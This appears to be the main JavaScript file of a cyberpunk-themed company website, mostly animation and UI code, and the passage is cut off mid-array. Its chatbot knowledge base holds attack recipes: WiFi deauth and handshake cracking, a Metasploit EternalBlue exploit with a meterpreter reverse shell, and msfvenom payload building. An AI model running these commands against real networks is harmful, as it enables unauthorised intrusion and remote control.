'use strict';

// =========================================================
// NEXO-TECHNOLOGIES CYBERPUNK CORE ENGINE v5.0
// Ultra-Responsive · AI Multi-Model · Neural Mesh · WebGL
// =========================================================

// --- State & Environmental Detection ---
let isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (window.innerWidth <= 768);
let isMobile = window.innerWidth <= 768;
let resizeTimeout = null;

// Handle Android dynamic viewport height
function updateAndroidViewport() {
  const vh = window.innerHeight * 0.01;
  document.documentElement.style.setProperty('--vh', `${vh}px`);
  isMobile = window.innerWidth <= 768;
  isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (window.innerWidth <= 768);
}

window.addEventListener('resize', () => {
  clearTimeout(resizeTimeout);
  resizeTimeout = setTimeout(() => {
    updateAndroidViewport();
    resizeCanvases();
  }, 100);
});

window.addEventListener('orientationchange', () => {
  setTimeout(() => {
    updateAndroidViewport();
    resizeCanvases();
  }, 200);
});

window.addEventListener('DOMContentLoaded', () => {
  updateAndroidViewport();
});

window.addEventListener('load', () => {
  updateAndroidViewport();
  setTimeout(() => {
    hideLoader();
    initAll();
  }, 1200);
});

function initAll() {
  initCursor();
  initMatrixBg();
  initConstellationMesh();
  initDecahedron();
  initHeroCanvas();
  initTypingEffect();
  initScrollReveal();
  initProficiencyBars();
  initCounterAnimation();
  initNavbar();
  initMobileMenu();
  initThemeToggle();
  initContactForm();
  initVisitorCounter();
  initParallax();
  initCardTilt();
  initParticleExplosion();
  initMagneticButtons();
  initBootSequence();
  initAIChat();
  initGlitchText();
  initTerminalText();
  initHexGrid();
  initScanLine();
  
  // Page specific hooks
  const path = window.location.pathname;
  if (path.includes('hacking.html')) initHackingPage();
  if (path.includes('learn-hacking.html')) initLearnPage();
  if (path.includes('programming.html')) initProgrammingPage();
}

// =========================================================
// 1. LOADER / BOOT SEQUENCE
// =========================================================
function hideLoader() {
  const loader = document.getElementById('loader');
  if (loader) {
    loader.classList.add('hidden');
    setTimeout(() => {
      loader.style.display = 'none';
    }, 600);
  }
}

function initBootSequence() {
  const bootTextEl = document.getElementById('boot-text');
  if (!bootTextEl) return;
  
  const messages = [
    'NEXO-TECHNOLOGIES CORE v5.0',
    'Initializing Neural Subsystems...',
    'Establishing Encrypted Link...',
    'Loading Security Protocols...',
    'SYSTEM READY // ALL CHANNELS NOMINAL'
  ];
  
  let msgIndex = 0;
  let charIndex = 0;
  
  function typeNextMessage() {
    if (msgIndex >= messages.length) return;
    
    const msg = messages[msgIndex];
    if (charIndex === 0) {
      bootTextEl.innerHTML += '<br><span class="boot-line"></span>';
    }
    
    const lines = bootTextEl.querySelectorAll('.boot-line');
    const currentLine = lines[lines.length - 1];
    
    if (currentLine && charIndex < msg.length) {
      currentLine.innerHTML += msg.charAt(charIndex);
      charIndex++;
      setTimeout(typeNextMessage, 25);
    } else {
      msgIndex++;
      charIndex = 0;
      setTimeout(typeNextMessage, 200);
    }
  }
  
  typeNextMessage();
}

// =========================================================
// 2. CUSTOM CURSOR (DESKTOP ONLY)
// =========================================================
function initCursor() {
  if (isTouchDevice) {
    const cur = document.getElementById('custom-cursor');
    const tr = document.getElementById('cursor-trail');
    if (cur) cur.style.display = 'none';
    if (tr) tr.style.display = 'none';
    return;
  }
  
  const cursor = document.getElementById('custom-cursor');
  const trail = document.getElementById('cursor-trail');
  if (!cursor || !trail) return;
  
  let mouseX = window.innerWidth / 2;
  let mouseY = window.innerHeight / 2;
  let trailX = mouseX;
  let trailY = mouseY;
  let isHovering = false;
  
  document.addEventListener('mousemove', (e) => {
    mouseX = e.clientX;
    mouseY = e.clientY;
    cursor.style.left = `${mouseX}px`;
    cursor.style.top = `${mouseY}px`;
    cursor.style.opacity = '1';
    trail.style.opacity = '1';
  });
  
  function animateTrail() {
    trailX += (mouseX - trailX) * 0.14;
    trailY += (mouseY - trailY) * 0.14;
    
    trail.style.left = `${trailX}px`;
    trail.style.top = `${trailY}px`;
    
    requestAnimationFrame(animateTrail);
  }
  animateTrail();
  
  document.addEventListener('mouseleave', () => {
    cursor.style.opacity = '0';
    trail.style.opacity = '0';
  });
  
  document.addEventListener('mouseenter', () => {
    cursor.style.opacity = '1';
    trail.style.opacity = '1';
  });
  
  const interactables = document.querySelectorAll('a, button, input, textarea, .interactive, .skill-card, .project-card, .service-card');
  interactables.forEach(el => {
    el.addEventListener('mouseenter', () => {
      isHovering = true;
      cursor.style.width = '18px';
      cursor.style.height = '18px';
      cursor.style.backgroundColor = '#ff006e';
      trail.style.borderColor = '#ff006e';
      trail.style.width = '42px';
      trail.style.height = '42px';
    });
    el.addEventListener('mouseleave', () => {
      isHovering = false;
      cursor.style.width = '10px';
      cursor.style.height = '10px';
      cursor.style.backgroundColor = '#00f5ff';
      trail.style.borderColor = 'rgba(0, 245, 255, 0.5)';
      trail.style.width = '32px';
      trail.style.height = '32px';
    });
  });
}

// =========================================================
// 3. MATRIX BACKGROUND
// =========================================================
let matrixCanvas, matrixCtx, matrixDrops;
function initMatrixBg() {
  matrixCanvas = document.getElementById('matrix-bg');
  if (!matrixCanvas) return;
  
  matrixCtx = matrixCanvas.getContext('2d');
  
  const dpr = Math.min(window.devicePixelRatio || 1, 1.5);
  matrixCanvas.width = window.innerWidth * dpr;
  matrixCanvas.height = window.innerHeight * dpr;
  matrixCtx.scale(dpr, dpr);
  
  const characters = 'NEXO0123456789ABCDEF!@#$%^&*アイウエオカキクケコサシスセソタチツテトナニヌネノ'.split('');
  const fontSize = 14;
  const columns = Math.floor(window.innerWidth / fontSize);
  
  matrixDrops = [];
  for (let x = 0; x < columns; x++) {
    matrixDrops[x] = Math.floor(Math.random() * -50);
  }
  
  function drawMatrix() {
    matrixCtx.fillStyle = 'rgba(2, 8, 18, 0.08)';
    matrixCtx.fillRect(0, 0, window.innerWidth, window.innerHeight);
    
    matrixCtx.fillStyle = '#00f5ff';
    matrixCtx.font = `${fontSize}px "JetBrains Mono", monospace`;
    
    for (let i = 0; i < matrixDrops.length; i++) {
      const char = characters[Math.floor(Math.random() * characters.length)];
      const x = i * fontSize;
      const y = matrixDrops[i] * fontSize;
      
      // Lead char is brighter
      matrixCtx.fillStyle = '#ffffff';
      matrixCtx.fillText(char, x, y);
      matrixCtx.fillStyle = '#00f5ff';
      
      if (y > window.innerHeight && Math.random() > 0.975) {
        matrixDrops[i] = 0;
      }
      matrixDrops[i]++;
    }
  }
  
  setInterval(drawMatrix, isMobile ? 65 : 45);
}

// =========================================================
// 4. CONSTELLATION INTERACTIVE NEURAL MESH
// =========================================================
let constCanvas, constCtx, constNodes = [];
function initConstellationMesh() {
  constCanvas = document.getElementById('constellation-canvas');
  if (!constCanvas) return;
  
  constCtx = constCanvas.getContext('2d');
  const dpr = Math.min(window.devicePixelRatio || 1, 1.5);
  
  constCanvas.width = window.innerWidth * dpr;
  constCanvas.height = window.innerHeight * dpr;
  constCtx.scale(dpr, dpr);
  
  const nodeCount = isMobile ? 25 : 55;
  constNodes = [];
  
  for (let i = 0; i < nodeCount; i++) {
    constNodes.push({
      x: Math.random() * window.innerWidth,
      y: Math.random() * window.innerHeight,
      vx: (Math.random() - 0.5) * 0.5,
      vy: (Math.random() - 0.5) * 0.5,
      radius: Math.random() * 2 + 1,
      color: i % 3 === 0 ? '#00f5ff' : i % 3 === 1 ? '#bf00ff' : '#00ff88'
    });
  }
  
  let mousePos = { x: -1000, y: -1000 };
  window.addEventListener('mousemove', (e) => {
    mousePos.x = e.clientX;
    mousePos.y = e.clientY;
  });
  
  window.addEventListener('touchmove', (e) => {
    if (e.touches && e.touches[0]) {
      mousePos.x = e.touches[0].clientX;
      mousePos.y = e.touches[0].clientY;
    }
  }, { passive: true });
  
  function drawConstellation() {
    constCtx.clearRect(0, 0, window.innerWidth, window.innerHeight);
    const maxDist = isMobile ? 90 : 130;
    
    // Update and draw nodes
    for (let i = 0; i < constNodes.length; i++) {
      const node = constNodes[i];
      node.x += node.vx;
      node.y += node.vy;
      
      if (node.x < 0 || node.x > window.innerWidth) node.vx *= -1;
      if (node.y < 0 || node.y > window.innerHeight) node.vy *= -1;
      
      constCtx.beginPath();
      constCtx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
      constCtx.fillStyle = node.color;
      constCtx.shadowColor = node.color;
      constCtx.shadowBlur = 8;
      constCtx.fill();
      constCtx.shadowBlur = 0;
      
      // Connect to other nodes
      for (let j = i + 1; j < constNodes.length; j++) {
        const other = constNodes[j];
        const dx = node.x - other.x;
        const dy = node.y - other.y;
        const dist = Math.hypot(dx, dy);
        
        if (dist < maxDist) {
          const alpha = (1 - dist / maxDist) * 0.25;
          constCtx.beginPath();
          constCtx.moveTo(node.x, node.y);
          constCtx.lineTo(other.x, other.y);
          constCtx.strokeStyle = `rgba(0, 245, 255, ${alpha})`;
          constCtx.lineWidth = 0.6;
          constCtx.stroke();
        }
      }
      
      // Connect to mouse
      const mouseDist = Math.hypot(node.x - mousePos.x, node.y - mousePos.y);
      if (mouseDist < 140) {
        const alpha = (1 - mouseDist / 140) * 0.6;
        constCtx.beginPath();
        constCtx.moveTo(node.x, node.y);
        constCtx.lineTo(mousePos.x, mousePos.y);
        constCtx.strokeStyle = `rgba(255, 0, 110, ${alpha})`;
        constCtx.lineWidth = 1;
        constCtx.stroke();
      }
    }
    
    requestAnimationFrame(drawConstellation);
  }
  
  drawConstellation();
}

// =========================================================
// 5. 3D DECAHEDRON / POLYGON HERO VISUALIZER
// =========================================================
function initDecahedron() {
  const canvas = document.getElementById('decahedron-canvas');
  if (!canvas) return;
  
  const ctx = canvas.getContext('2d');
  const size = Math.min(canvas.width, canvas.height);
  const cx = canvas.width / 2;
  const cy = canvas.height / 2;
  
  let angleX = 0;
  let angleY = 0;
  let angleZ = 0;
  
  // Vertices of an icosahedron / geometric cyber sphere
  const t = (1 + Math.sqrt(5)) / 2;
  const vertices = [
    [-1, t, 0], [1, t, 0], [-1, -t, 0], [1, -t, 0],
    [0, -1, t], [0, 1, t], [0, -1, -t], [0, 1, -t],
    [t, 0, -1], [t, 0, 1], [-t, 0, -1], [-t, 0, 1]
  ];
  
  const edges = [
    [0, 11], [0, 5], [0, 1], [0, 7], [0, 10],
    [1, 5], [5, 11], [11, 10], [10, 7], [7, 1],
    [3, 9], [3, 4], [3, 2], [3, 6], [3, 8],
    [4, 9], [9, 8], [8, 6], [6, 2], [2, 4],
    [4, 5], [5, 9], [8, 1], [1, 9], [7, 8],
    [7, 6], [10, 2], [10, 6], [11, 4], [11, 2]
  ];
  
  function rotateX(p, a) {
    const cos = Math.cos(a), sin = Math.sin(a);
    return [p[0], p[1] * cos - p[2] * sin, p[1] * sin + p[2] * cos];
  }
  function rotateY(p, a) {
    const cos = Math.cos(a), sin = Math.sin(a);
    return [p[0] * cos + p[2] * sin, p[1], -p[0] * sin + p[2] * cos];
  }
  function rotateZ(p, a) {
    const cos = Math.cos(a), sin = Math.sin(a);
    return [p[0] * cos - p[1] * sin, p[0] * sin + p[1] * cos, p[2]];
  }
  
  function render() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    
    angleX += 0.008;
    angleY += 0.012;
    angleZ += 0.005;
    
    const scale = size * 0.28;
    const projected = vertices.map(v => {
      let p = rotateX(v, angleX);
      p = rotateY(p, angleY);
      p = rotateZ(p, angleZ);
      const fov = 3.5;
      const z = p[2] + fov;
      return [
        cx + (p[0] * scale) / z,
        cy + (p[1] * scale) / z,
        p[2]
      ];
    });
    
    // Draw edges
    edges.forEach(edge => {
      const p1 = projected[edge[0]];
      const p2 = projected[edge[1]];
      const avgZ = (p1[2] + p2[2]) / 2;
      const alpha = Math.max(0.2, (avgZ + 2) / 4);
      
      ctx.beginPath();
      ctx.moveTo(p1[0], p1[1]);
      ctx.lineTo(p2[0], p2[1]);
      ctx.strokeStyle = `rgba(0, 245, 255, ${alpha})`;
      ctx.lineWidth = 1.6;
      ctx.shadowColor = '#00f5ff';
      ctx.shadowBlur = 10;
      ctx.stroke();
      ctx.shadowBlur = 0;
    });
    
    // Draw nodes
    projected.forEach(p => {
      ctx.beginPath();
      ctx.arc(p[0], p[1], 4, 0, Math.PI * 2);
      ctx.fillStyle = '#ff006e';
      ctx.shadowColor = '#ff006e';
      ctx.shadowBlur = 12;
      ctx.fill();
      ctx.shadowBlur = 0;
    });
    
    requestAnimationFrame(render);
  }
  
  render();
}

// =========================================================
// 6. HERO CANVAS DYNAMIC PARTICLES
// =========================================================
function initHeroCanvas() {
  const canvas = document.getElementById('hero-canvas');
  if (!canvas) return;
  
  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  
  const particles = Array.from({ length: isMobile ? 30 : 70 }, () => ({
    x: Math.random() * canvas.width,
    y: Math.random() * canvas.height,
    radius: Math.random() * 2 + 0.5,
    speedX: (Math.random() - 0.5) * 0.6,
    speedY: (Math.random() - 0.5) * 0.6,
    opacity: Math.random() * 0.5 + 0.1
  }));
  
  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    
    particles.forEach(p => {
      p.x += p.speedX;
      p.y += p.speedY;
      
      if (p.x < 0) p.x = canvas.width;
      if (p.x > canvas.width) p.x = 0;
      if (p.y < 0) p.y = canvas.height;
      if (p.y > canvas.height) p.y = 0;
      
      ctx.beginPath();
      ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(0, 245, 255, ${p.opacity})`;
      ctx.fill();
    });
    
    requestAnimationFrame(animate);
  }
  animate();
}

// Resizing all canvases
function resizeCanvases() {
  if (matrixCanvas) {
    matrixCanvas.width = window.innerWidth;
    matrixCanvas.height = window.innerHeight;
  }
  if (constCanvas) {
    const dpr = Math.min(window.devicePixelRatio || 1, 1.5);
    constCanvas.width = window.innerWidth * dpr;
    constCanvas.height = window.innerHeight * dpr;
    if (constCtx) constCtx.scale(dpr, dpr);
  }
  const heroCvs = document.getElementById('hero-canvas');
  if (heroCvs) {
    heroCvs.width = window.innerWidth;
    heroCvs.height = window.innerHeight;
  }
}

// =========================================================
// 7. TYPING EFFECT
// =========================================================
function initTypingEffect() {
  const typedEl = document.getElementById('hero-typed');
  if (!typedEl) return;
  
  const words = [
    'Polyglot Software Engineers',
    'Grey Hat Cybersecurity Collective',
    'Advanced Linux Hardening',
    'Autonomous Automation Toolkits',
    'Low-Level Network Stress Architectures',
    'Next-Gen Web & Mobile Platforms'
  ];
  
  let wordIndex = 0;
  let charIndex = 0;
  let isDeleting = false;
  
  function type() {
    const currentWord = words[wordIndex];
    
    if (isDeleting) {
      typedEl.textContent = currentWord.substring(0, charIndex - 1);
      charIndex--;
    } else {
      typedEl.textContent = currentWord.substring(0, charIndex + 1);
      charIndex++;
    }
    
    let typeSpeed = isDeleting ? 30 : 60;
    
    if (!isDeleting && charIndex === currentWord.length) {
      typeSpeed = 2200; // Pause at end
      isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      wordIndex = (wordIndex + 1) % words.length;
      typeSpeed = 400;
    }
    
    setTimeout(type, typeSpeed);
  }
  
  type();
}

// =========================================================
// 8. SCROLL REVEAL ANIMATION
// =========================================================
function initScrollReveal() {
  const reveals = document.querySelectorAll('.reveal, .reveal-left, .reveal-right');
  
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        observer.unobserve(entry.target);
      }
    });
  }, {
    threshold: 0.12,
    rootMargin: '0px 0px -40px 0px'
  });
  
  reveals.forEach(el => observer.observe(el));
}

// =========================================================
// 9. PROFICIENCY BARS
// =========================================================
function initProficiencyBars() {
  const profSection = document.querySelector('.proficiency-section');
  if (!profSection) return;
  
  const bars = profSection.querySelectorAll('.prof-bar-fill');
  
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        bars.forEach(bar => {
          const targetWidth = bar.getAttribute('data-width') || '85';
          bar.style.width = `${targetWidth}%`;
        });
        observer.unobserve(entry.target);
      }
    });
  }, { threshold: 0.2 });
  
  observer.observe(profSection);
}

// =========================================================
// 10. COUNTER ANIMATION
// =========================================================
function initCounterAnimation() {
  const statNums = document.querySelectorAll('.stat-num[data-count]');
  if (statNums.length === 0) return;
  
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const el = entry.target;
        const target = parseInt(el.getAttribute('data-count'), 10);
        let current = 0;
        const increment = Math.max(1, Math.ceil(target / 40));
        const timer = setInterval(() => {
          current += increment;
          if (current >= target) {
            el.textContent = `${target}+`;
            clearInterval(timer);
          } else {
            el.textContent = current;
          }
        }, 30);
        observer.unobserve(el);
      }
    });
  }, { threshold: 0.3 });
  
  statNums.forEach(el => observer.observe(el));
}

// =========================================================
// 11. NAVBAR SCROLL & ACTIVE STATE
// =========================================================
function initNavbar() {
  const navbar = document.getElementById('navbar');
  if (!navbar) return;
  
  window.addEventListener('scroll', () => {
    if (window.scrollY > 50) {
      navbar.classList.add('scrolled');
    } else {
      navbar.classList.remove('scrolled');
    }
  }, { passive: true });
}

function scrollToTop() {
  window.scrollTo({ top: 0, behavior: 'smooth' });
}
window.scrollToTop = scrollToTop;

// =========================================================
// 12. MOBILE MENU & TOUCH OPTIMIZATIONS
// =========================================================
function initMobileMenu() {
  const toggle = document.getElementById('mobileMenuToggle');
  const menu = document.getElementById('nav-menu');
  if (!toggle || !menu) return;
  
  toggle.addEventListener('click', (e) => {
    e.stopPropagation();
    const isActive = menu.classList.toggle('active');
    toggle.setAttribute('aria-expanded', isActive);
    toggle.innerHTML = isActive ? '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
  });
  
  // Close menu when tapping outside
  document.addEventListener('click', (e) => {
    if (menu.classList.contains('active') && !menu.contains(e.target) && e.target !== toggle) {
      menu.classList.remove('active');
      toggle.innerHTML = '<i class="fas fa-bars"></i>';
    }
  });
  
  // Close menu when clicking links
  menu.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', () => {
      menu.classList.remove('active');
      toggle.innerHTML = '<i class="fas fa-bars"></i>';
    });
  });
}

// =========================================================
// 13. THEME TOGGLE
// =========================================================
function initThemeToggle() {
  const toggle = document.getElementById('themeToggle');
  if (!toggle) return;
  
  const savedTheme = localStorage.getItem('nexo_theme') || 'dark';
  document.documentElement.setAttribute('data-theme', savedTheme);
  updateThemeIcon(savedTheme);
  
  toggle.addEventListener('click', () => {
    const current = document.documentElement.getAttribute('data-theme') || 'dark';
    const next = current === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', next);
    localStorage.setItem('nexo_theme', next);
    updateThemeIcon(next);
  });
  
  function updateThemeIcon(theme) {
    const icon = toggle.querySelector('i');
    if (icon) {
      icon.className = theme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
    }
  }
}

// =========================================================
// 14. CONTACT FORM
// =========================================================
function initContactForm() {
  const form = document.getElementById('contactForm');
  if (!form) return;
  
  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const btn = form.querySelector('button[type="submit"]');
    const originalText = btn.innerHTML;
    
    btn.innerHTML = '<i class="fas fa-check-circle"></i> TRANSMISSION SENT';
    btn.style.background = 'var(--neon-green)';
    btn.style.color = '#020812';
    
    setTimeout(() => {
      form.reset();
      btn.innerHTML = originalText;
      btn.style.background = '';
      btn.style.color = '';
    }, 3000);
  });
}

// =========================================================
// 15. VISITOR COUNTER
// =========================================================
function initVisitorCounter() {
  const countEl = document.getElementById('visitor-count');
  if (!countEl) return;
  
  let visits = parseInt(localStorage.getItem('nexo_visits') || '1337', 10);
  visits += 1;
  localStorage.setItem('nexo_visits', visits.toString());
  countEl.textContent = visits.toLocaleString();
}

// =========================================================
// 16. PARALLAX EFFECTS
// =========================================================
function initParallax() {
  if (isTouchDevice) return; // Save CPU on mobile
  
  const orbs = document.querySelectorAll('.orb');
  window.addEventListener('mousemove', (e) => {
    const x = (e.clientX / window.innerWidth - 0.5) * 40;
    const y = (e.clientY / window.innerHeight - 0.5) * 40;
    
    orbs.forEach((orb, i) => {
      const factor = (i + 1) * 0.4;
      orb.style.transform = `translate(${x * factor}px, ${y * factor}px)`;
    });
  });
}

// =========================================================
// 17. 3D CARD TILT EFFECT
// =========================================================
function initCardTilt() {
  if (isTouchDevice) return;
  
  const cards = document.querySelectorAll('.skill-card, .project-card, .service-card, .security-card, .tool-card, .lab-card');
  
  cards.forEach(card => {
    card.addEventListener('mousemove', (e) => {
      const rect = card.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;
      
      const centerX = rect.width / 2;
      const centerY = rect.height / 2;
      
      const rotateX = ((y - centerY) / centerY) * -8;
      const rotateY = ((x - centerX) / centerX) * 8;
      
      card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-6px)`;
    });
    
    card.addEventListener('mouseleave', () => {
      card.style.transform = '';
    });
  });
}

// =========================================================
// 18. PARTICLE EXPLOSION ON INTERACTION
// =========================================================
function initParticleExplosion() {
  document.addEventListener('click', (e) => {
    if (e.target.closest('button, .btn, .nav-link, .quick-chip, .tool-btn')) {
      createParticleBurst(e.clientX, e.clientY);
    }
  });
}

function createParticleBurst(x, y) {
  const colors = ['#00f5ff', '#ff006e', '#00ff88', '#ffd700'];
  const count = isMobile ? 6 : 12;
  
  for (let i = 0; i < count; i++) {
    const particle = document.createElement('div');
    document.body.appendChild(particle);
    
    const size = Math.random() * 5 + 2;
    const color = colors[Math.floor(Math.random() * colors.length)];
    
    particle.style.width = `${size}px`;
    particle.style.height = `${size}px`;
    particle.style.backgroundColor = color;
    particle.style.left = `${x}px`;
    particle.style.top = `${y}px`;
    particle.style.position = 'fixed';
    particle.style.borderRadius = '50%';
    particle.style.pointerEvents = 'none';
    particle.style.zIndex = '99999';
    particle.style.boxShadow = `0 0 8px ${color}`;
    
    const angle = Math.random() * Math.PI * 2;
    const velocity = Math.random() * 45 + 15;
    const tx = Math.cos(angle) * velocity;
    const ty = Math.sin(angle) * velocity;
    
    particle.animate([
      { transform: 'translate(0, 0) scale(1)', opacity: 1 },
      { transform: `translate(${tx}px, ${ty}px) scale(0)`, opacity: 0 }
    ], {
      duration: 500,
      easing: 'cubic-bezier(0, .9, .57, 1)'
    }).onfinish = () => particle.remove();
  }
}

// =========================================================
// 19. MAGNETIC BUTTONS (DESKTOP)
// =========================================================
function initMagneticButtons() {
  if (isTouchDevice) return;
  
  const buttons = document.querySelectorAll('.btn-primary, #ai-float-btn, #chatSendBtn');
  
  buttons.forEach(btn => {
    btn.addEventListener('mousemove', (e) => {
      const rect = btn.getBoundingClientRect();
      const x = e.clientX - (rect.left + rect.width / 2);
      const y = e.clientY - (rect.top + rect.height / 2);
      btn.style.transform = `translate(${x * 0.25}px, ${y * 0.25}px)`;
    });
    
    btn.addEventListener('mouseleave', () => {
      btn.style.transform = '';
    });
  });
}

// =========================================================
// 20. HYBRID NEXO-AI CHAT ENGINE
// 100% Guaranteed Uptime · Multi-Model Support · Smart Fallback
// =========================================================
const NEXO_KNOWLEDGE_BASE = {
  identity: "NEXO-TECHNOLOGIES is an elite software engineering collective and cybersecurity research corp founded in 2021 by Alexander (demonalexander526). We engineer high-concurrency distributed backends, memory-safe system utilities in Rust & C++, custom penetration testing frameworks, and high-impact web and mobile platforms.",
  skills: "Core technical proficiency matrix:\n• Python (95%): Exploit automation (scapy, paramiko, socket), FastAPI backends, NLP engines.\n• Shell/Bash (92%): Linux administration, Termux security toolkits, automated hardening.\n• Java (88%): Enterprise Spring Boot microservices, high-throughput worker pools, Android native.\n• JavaScript/Node.js (85%): Baileys WhatsApp bot architecture, WebGL & Canvas 2D graphics, async event loops.\n• C++ / C# (82%): Direct memory manipulation, pointers, RAII, .NET Core security applications.\n• Rust (78%): Zero-cost abstractions, borrow checker memory safety, Tokio async I/O socket streaming.\n• Golang (74%): Lightweight goroutines, high-concurrency network scanners, self-contained binaries.\n• Dart/Flutter (72%): Cross-platform iOS, Android, and Web native interfaces.",
  services: "Commercial engineering catalog:\n• Web Architecture: Standard ($200) · Commercial ($500) · Enterprise Custom ($1000+)\n• Mobile Applications: MVP ($800) · Native iOS/Android ($1500) · Cross-Platform Flutter ($2500) · Enterprise ($5000+)\n• Security Audits: Web App OWASP Pentest, Linux Server Hardening, Codebase Vulnerability Auditing.",
  projects: "Active battle-tested weapon cache & Flagship OS:\n 1. ASTERIX-OS: Custom cyber operating system & hardened kernel — the company pride of NEXO-TECHNOLOGIES.\n2. Asterix-Anti-Network-Attack: Real-time autonomous DDoS mitigation & defensive packet scrubber.\n3. APEX-OVERDRIVE: High-concurrency async load generator & stress benchmark.\n4. LIGHTNING: Ultra-fast low-latency socket dispatcher.\n5. REDOX-PY_SCANNER: Python network vulnerability & port audit suite.\n6. THUNDER: High-throughput parallel socket driver.\n7. DEMONIC-BOT: Intelligent WhatsApp multi-purpose bot built on Node.js and Baileys.\n8. DEMONIC_TOOLS: Comprehensive Linux security administration toolkit.\n9. NEXO-TECH IP FLOODER: High-performance network stress tester written in Rust.\n10. R&D Innovation Lab: CryptVault zero-knowledge vault and AutoPwn red-team framework.",
  asterixos: " ASTERIX-OS // THE FLAGSHIP CYBER OPERATING SYSTEM & COMPANY PRIDE OF NEXO-TECHNOLOGIES:\n• Architecture: Custom security-hardened Linux/Microkernel hybrid distribution engineered from the ground up for extreme red-team operations, autonomous network defense, and zero-telemetry operational security.\n• Repositories: Official GitHub (https://github.com/NEXO-TECHNOLOGIES/ASTERIX-OS.git) & Official GitLab (https://gitlab.com/nexo-technologies-group/asterix-os.git).\n• Integrated Defensive Core: Pre-baked with Asterix-Anti-Network-Attack scrubbing daemons, native eBPF kernel packet filters, post-quantum CRYSTALS-Kyber memory encryption, and zero-latency terminal hypervisor.\n• Pre-installed Arsenal: APEX-OVERDRIVE, LIGHTNING, REDOX-PY_SCANNER, THUNDER, DEMONIC_TOOLS, and NEXO IP FLOODER.",
  contact: "Official communication matrices:\n• WhatsApp: +234 704 4339 491 (Direct Hotline)\n• Email: demonalexander526@gmail.com\n• Telegram: @Vershdit\n• GitHub: github.com/demonalexander526-alt\n• Location: Lagos, Nigeria // Global Deployments",
  hacking: "Cybersecurity operations adhere to rigorous red-team defensive testing. Framework covers: Reconnaissance (Nmap, Shodan, REDOX-PY_SCANNER), Vulnerability Analysis (CVE databases), Exploitation (Metasploit, APEX-OVERDRIVE, THUNDER, custom Python payloads), and Real-time Defense (Asterix-Anti-Network-Attack, ASTERIX-OS eBPF filters).",
  wifi: "Wireless Penetration Testing (802.11 frames):\n1. Monitor Mode: `airmon-ng start wlan0`\n2. Packet Sniffing: `airodump-ng mon0` to capture BSSID & channel\n3. Deauth Attack: `aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> mon0`\n4. 4-Way Handshake Capture: Extract EAPOL handshake\n5. Offline Cracking: `aircrack-ng -w wordlist.txt capture-01.cap`\nDefensive hardening: Enforce WPA3-SAE with Protected Management Frames (PMF).",
  metasploit: "Metasploit Framework & Exploit Delivery:\n• Console: `msfconsole -q` | Search: `search eternalblue` (MS17-010)\n• Configuration: `use exploit/windows/smb/ms17_010_eternalblue` -> `set RHOSTS <IP>` -> `set LHOST <IP>`\n• Payload: `set PAYLOAD windows/x64/meterpreter/reverse_tcp` -> `exploit`\n• Meterpreter commands: `sysinfo`, `getsystem`, `hashdump`, `shell`\n• Payload generator: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o payload.exe`",
  wireshark: "Wireshark Packet Dissection & Network Forensics:\n• Capture filters: `tcpdump -i eth0 -nn -s0 -w traffic.pcap`\n• Key display filters:\n  - `http.request.method == \"POST\"` (Credentials & forms)\n  - `tcp.flags.syn == 1 && tcp.flags.ack == 0` (SYN port scan detection)\n  - `dns.flags.response == 0` (DNS queries)\n• TCP Stream Reconstruction: Follow -> TCP Stream to recover plaintext payload bytes.",
  crypto: "Modern Cryptographic Implementations:\n• Symmetric: AES-256-GCM and Fernet (`cryptography.fernet` in Python with PBKDF2 HMAC SHA-256 key derivation).\n• Asymmetric: RSA-4096 and ECC Curve25519 for public key exchange.\n• Hashing: SHA-256 / SHA-512 with salt, bcrypt/argon2 for password storage.",
  linux: "Linux Kernel Hardening & Defense-in-Depth:\n• Kernel parameters (`/etc/sysctl.conf`): disable IP forwarding, ignore ICMP echo broadcasts, enable TCP SYN cookies (`net.ipv4.tcp_syncookies = 1`), randomize memory space (`kernel.randomize_va_space = 2`).\n• Firewall: `ufw default deny incoming`, `ufw allow 22/tcp`, `ufw allow 443/tcp`.\n• Intrusion Prevention: Fail2ban jails for SSH brute-force protection.\n• Next-Gen OS: Powered by ASTERIX-OS custom kernel distribution.",
  rust: "Rust Systems Programming:\n• Zero-cost abstractions compiling directly to machine code.\n• Memory safety without garbage collection enforced by the borrow checker (eliminating use-after-free, buffer overflows, data races).\n• Tokio runtime for asynchronous concurrency with non-blocking socket loops.",
  python: "Python Cyber Automation:\n• Exploit development with `scapy` for raw packet forging.\n• SSH remote command execution with `paramiko`.\n• Asynchronous REST API backends with `fastapi` and `pydantic`.\n• Network recon with REDOX-PY_SCANNER."
};

const AI_MODELS = [
  { id: 'deepseek-v4-flash:cloud', name: 'DeepSeek Flash', icon: '<i class="fas fa-bolt"></i>', color: '#00f5ff', promptMod: 'Fast, precise, technical cyberpunk response.' },
  { id: 'qwen3.8', name: 'Qwen 3.8', icon: '<i class="fas fa-brain"></i>', color: '#bf00ff', promptMod: 'Deep analytical and architectural breakdown.' },
  { id: 'nemotron-3.5-lightning', name: 'Nemotron Lightning', icon: '<i class="fas fa-tachometer-alt"></i>', color: '#ffd700', promptMod: 'Aggressive optimization and performance metrics.' },
